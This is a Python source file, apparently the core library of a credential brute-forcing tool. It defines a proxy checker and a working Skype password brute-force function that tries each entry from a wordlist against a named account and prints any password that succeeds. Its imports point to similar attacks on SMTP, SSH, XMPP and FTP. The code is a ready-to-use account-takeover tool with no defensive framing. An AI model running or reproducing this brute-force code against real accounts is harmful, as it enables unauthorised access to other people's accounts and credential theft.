
'''
mainLib.py - Core methods and global variables that occur after user parsing and initial
             output.
'''


import socket, os, requests
from time import sleep
from sys import *
from random import *
from subprocess import call

import smtplib, argparse, paramiko, skpy, mechanize
from xmpp import *
from ftplib import FTP

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


def proxyServer(proxy):
    proxy = open(proxy, 'r')
    for i in proxy.readlines():
        proxyaddr = i.strip("\n")
        try:
            proxies = {"http" : "http://"+str(proxyaddr)}
            r = requests.get("http://google.com", proxies=proxies)
            print G + "[✓]" + W + (" Proxy %s is found! " % proxyaddr)
        except requests.exceptions.ProxyError:
            print R + "[X]" + W + (" Proxy %s is NOT found!" % proxyaddr)

        proxy.close()

def skypeBruteforce(username, wordlist, delay):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            sk = skpy.Skype(username, password)
            print G + "Username: %s | Password found: %s\n" % (username, password) + W
            exit()
        except skpy.core.SkypeAuthException:
            print O + "Username: %s | Password: %s | Incorrect!\n" % (username, password) + W
            sleep(delay)
